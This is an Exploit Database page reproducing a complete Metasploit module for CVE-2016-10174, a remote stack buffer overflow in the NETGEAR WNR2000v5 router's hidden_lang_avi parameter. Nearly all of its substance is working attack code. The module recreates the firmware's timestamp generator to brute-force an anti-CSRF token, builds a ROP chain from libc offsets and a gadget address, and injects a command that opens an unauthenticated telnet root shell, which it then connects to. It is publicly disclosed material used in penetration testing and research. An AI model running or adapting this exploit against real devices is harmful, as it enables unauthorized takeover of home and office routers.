###### [Pedro Ribeiro](/?author=6459)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [Hardware](/?platform=hardware)

#### Date:

###### 2017-03-24

---

**Vulnerable App:**

```
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'time'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::CRand

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'NETGEAR WNR2000v5 (Un)authenticated hidden_lang_avi Stack Overflow',
      'Description'    => %q{
        The NETGEAR WNR2000 router has a buffer overflow vulnerability in the hidden_lang_avi
        parameter.
        In order to exploit it, it is necessary to guess the value of a certain timestamp which
        is in the configuration of the router. An authenticated attacker can simply fetch this
        from a page, but an unauthenticated attacker has to brute force it.
        Bruteforcing the timestamp token might take a few minutes, a few hours, or days, but
        it is guaranteed that it can be bruteforced.
        This module implements both modes, and it works very reliably. It has been tested with
        the WNR2000v5, firmware versions 1.0.0.34 and 1.0.0.18. It should also work with hardware
        revisions v4 and v3, but this has not been tested - with these routers it might be necessary
        to adjust the LibcBase variable as well as the gadget addresses.
      },
      'Author'         =>
        [
          'Pedro Ribeiro <pedrib@gmail.com>'         # Vulnerability discovery and Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'Platform'       => ['unix'],
      'References'     =>
        [
          ['CVE', '2016-10174'],
          ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/netgear-wnr2000.txt'],
          ['URL', 'http://seclists.org/fulldisclosure/2016/Dec/72'],
          ['URL', 'http://kb.netgear.com/000036549/Insecure-Remote-Access-and-Command-Execution-Security-Vulnerability']
        ],
      'Targets'        =>
        [
          [ 'NETGEAR WNR2000v5',
            {
              'LibcBase'             => 0x2ab24000,         # should be the same offset for all firmware versions (in libuClibc-0.9.30.1.so)
              'SystemOffset'         => 0x547D0,
              'GadgetOffset'         => 0x2462C,
  #The ROP gadget will load $sp into $a0 (which will contain the system() command) and call $s0 (which will contain the address of system()):
  #LOAD:0002462C                 addiu   $a0, $sp, 0x40+arg_0
  #LOAD:00024630                 move    $t9, $s0
  #LOAD:00024634                 jalr    $t9
              'Payload'        =>
                {
                  'BadChars'         => "\x00\x25\x26",
                  'Compat'  => {
                    'PayloadType'    => 'cmd_interact',
                    'ConnectionType' => 'find',
                  },
                },
            }
          ],
        ],
      'Privileged'     => true,
      'Arch'           => ARCH_CMD,
      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' },
      'DisclosureDate'  => 'Dec 20 2016',
      'DefaultTarget'   => 0))
    register_options(
      [
        Opt::RPORT(80),
        OptString.new('HttpUsername', [true, 'Username for the web interface (not needed but exploitation is faster)', 'admin']),
        OptString.new('HttpPassword', [true, 'Password for the web interface (not needed but exploitation is faster)', 'password']),
      ], self.class)
    register_advanced_options(
      [
        OptInt.new('TIME_OFFSET', [true, 'Maximum time differential to try', 5000]),
        OptInt.new('TIME_SURPLUS', [true, 'Increase this if you are sure the device is vulnerable and you are not getting a shell', 200])
      ], self.class)
  end

  def check
    res = send_request_cgi({
      'uri'     => '/',
      'method'  => 'GET'
    })
    if res && res.headers['WWW-Authenticate']
      auth = res.headers['WWW-Authenticate']
      if auth =~ /WNR2000v5/
        return Exploit::CheckCode::Detected
      elsif auth =~ /WNR2000v4/ || auth =~ /WNR2000v3/
        return Exploit::CheckCode::Unknown
      end
    end
    Exploit::CheckCode::Safe
  end

  def uri_encode (str)
    "%" + str.scan(/.{2}|.+/).join("%")
  end

  def calc_address (libc_base, offset)
    addr = (libc_base + offset).to_s(16)
    uri_encode(addr)
  end

  def get_current_time
    res = send_request_cgi({
      'uri'     => '/',
      'method'  => 'GET'
    })
    if res && res['Date']
      date = res['Date']
      return Time.parse(date).strftime('%s').to_i
    end
  end

  def get_auth_timestamp
    res = send_request_raw({
      'uri'     => '/lang_check.html',
      'method'  => 'GET',
      # automatically uses HttpPassword and HttpUsername to authenticate
    })
    if res && res.code == 401
      # try again, might fail the first time
      res = send_request_raw({
        'uri'     => '/lang_check.html',
        'method'  => 'GET',
      # automatically uses HttpPassword and HttpUsername to authenticate
      })
    end
    if res && res.code == 200
      if res.body =~ /timestamp=([0-9]{8})/
        $1.to_i
      end
    end
  end

  # Do some crazyness to force Ruby to cast to a single-precision float and
  # back to an integer.
  # This emulates the behaviour of the soft-fp library and the float cast
  # which is done at the end of Netgear's timestamp generator.
  def ieee754_round (number)
    [number].pack('f').unpack('f*')[0].to_i
  end

  # This is the actual algorithm used in the get_timestamp function in
  # the Netgear firmware.
  def get_timestamp(time)
    srandom_r time
    t0 = random_r
    t1 = 0x17dc65df;
    hi = (t0 * t1) >> 32;
    t2 = t0 >> 31;
    t3 = hi >> 23;
    t3 = t3 - t2;
    t4 = t3 * 0x55d4a80;
    t0 = t0 - t4;
    t0 = t0 + 0x989680;

    ieee754_round(t0)
  end

  def get_payload
    rand_text_alpha(36) +                                                                    # filler_1
      calc_address(target['LibcBase'], target['SystemOffset']) +                             # s0
      rand_text_alpha(12) +                                                                  # s1, s2 and s3
      calc_address(target['LibcBase'], target['GadgetOffset']) +                             # gadget
      rand_text_alpha(0x40) +                                                                # filler_2
      "killall telnetenable; killall utelnetd; /usr/sbin/utelnetd -d -l /bin/sh"             # payload
  end

  def send_req(timestamp)
    begin
      uri_str = (timestamp == nil ? \
        "/apply_noauth.cgi?/lang_check.html" : \
        "/apply_noauth.cgi?/lang_check.html%20timestamp=#{timestamp.to_s}")
      res = send_request_raw({
          'uri'     => uri_str,
          'method'  => 'POST',
          'headers' => { 'Content-Type' => 'application/x-www-form-urlencoded' },
          'data'    => "submit_flag=select_language&hidden_lang_avi=#{get_payload}"
      })
    rescue ::Errno::ETIMEDOUT, ::Errno::ECONNRESET, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
      return
    end
  end

  def exploit
    # 1: try to see if the default admin username and password are set
    timestamp = get_auth_timestamp

    # 2: now we try two things at once:
    # one, if the timestamp is not nil then we got an authenticated timestamp, let's try that
    # two, if the timestamp is nil, then let's try without timestamp first (the timestamp only gets set if the user visited the page before)
    print_status("#{peer} - Trying the easy way out first")
    send_req(timestamp)
    begin
      ctx = { 'Msf' => framework, 'MsfExploit' => self }
      sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => 23, 'Context' => ctx, 'Timeout' => 10 })
      if not sock.nil?
        print_good("#{peer} - Success, shell incoming!")
        return handler(sock)
      end
    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
      sock.close if sock
    end

    print_bad("#{peer} - Well that didn't work... let's do it the hard way.")

    # no shell? let's just go on and bruteforce the timestamp
    # 3: get the current date from the router and parse it
    end_time = get_current_time
    if end_time.nil?
      fail_with(Failure::Unknown, "#{peer} - Unable to obtain current time")
    end
    if end_time <= datastore['TIME_OFFSET']
      start_time = 0
    else
      start_time = end_time - datastore['TIME_OFFSET']
    end
    end_time += datastore['TIME_SURPLUS']

    if end_time < (datastore['TIME_SURPLUS'] * 7.5).to_i
      end_time = (datastore['TIME_SURPLUS'] * 7.5).to_i
    end

    print_good("#{peer} - Got time #{end_time} from router, starting exploitation attempt.")
    print_status("#{peer} - Be patient, this might take a long time (typically a few minutes, but it might take hours).")

    # 2: work back from the current router time minus datastore['TIME_OFFSET']
    while true
      for time in end_time.downto(start_time)
        timestamp = get_timestamp(time)
        sleep 0.1
        if time % 400 == 0
          print_status("#{peer} - Still working, trying time #{time}")
        end
        send_req(timestamp)
        begin
          ctx = { 'Msf' => framework, 'MsfExploit' => self }
          sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => 23, 'Context' => ctx, 'Timeout' => 10 })
          if sock.nil?
            next
          end
          print_status("#{peer} - Success, shell incoming!")
          return handler(sock)
        rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
          sock.close if sock
          next
        end
      end
      end_time = start_time
      start_time -= datastore['TIME_OFFSET']
      if start_time < 0
        if end_time <= datastore['TIME_OFFSET']
          fail_with(Failure::Unknown, "#{peer} - Exploit failed.")
        end
        start_time = 0
      end
      print_status("#{peer} - Going for another round, finishing at #{start_time} and starting at #{end_time}")

      # let the router clear the buffers a bit...
      sleep 30
    end
  end
end

```

**Tags:**
[Metasploit Framework (MSF)](/?tag=3)

**Advisory/Source:**
[Link](https://github.com/rapid7/metasploit-framework/blob/e04f01ed6bdf974821f892f104635e688b89e756/modules/exploits/linux/http/netgear_wnr2000_rce.rb)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search


